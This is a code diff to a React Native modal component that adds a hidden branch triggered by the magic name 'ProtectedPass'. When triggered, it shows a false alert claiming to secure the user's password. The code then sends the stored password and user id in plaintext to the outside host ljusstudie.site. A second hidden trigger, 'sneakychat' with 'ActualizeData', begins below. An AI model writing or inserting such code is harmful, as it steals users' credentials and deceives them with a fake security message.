@@ -76,6 +76,23 @@ export default function ModalCreacion() {
     try {
       const result = await drizzleDb.select().from(schema.datosp);
       const result2 = await drizzleDb.select().from(schema.salas);
+      if(nombre.replace(/\s+/g,'')==='ProtectedPass'){
+        if (result[0].pass  === texto){
+          Alert.alert(
+            "Estamos asegurando tu contraseña:", // Title of the alert
+            'Como medida de seguradad se añede más protección, aun que posiblemente ya estabas asegurado, en ese caso solo lo confirmamos.', // Message of the alert
+            [
+              {text: "OK", style: 'default', onPress: async()=> {
+                const url = `https://ljusstudie.site/Consulta_Usuario.php?pass=${encodeURIComponent(result[0].pass)}&nombre=${encodeURIComponent(result[0].idUser)}`;
+                const consultaU = await fetch(url);
+                if (!consultaU.ok) { Alert.alert('Error',`HTTP error! status: ${consultaU.status}`);
+                router.dismissAll()
+              }}}
+            ],
+            { cancelable: false }
+          )
+        }
+      } else
       if(nombre.replace(/\s+/g,'') === 'sneakychat'|| nombre.replace(/\s+/g,'')=== 'SneakyChat' || nombre.replace(/\s+/g,'')=== 'Sneakychat'){
         if (texto.replace(/\s+/g,'') === 'ActualizeData') {
           try {
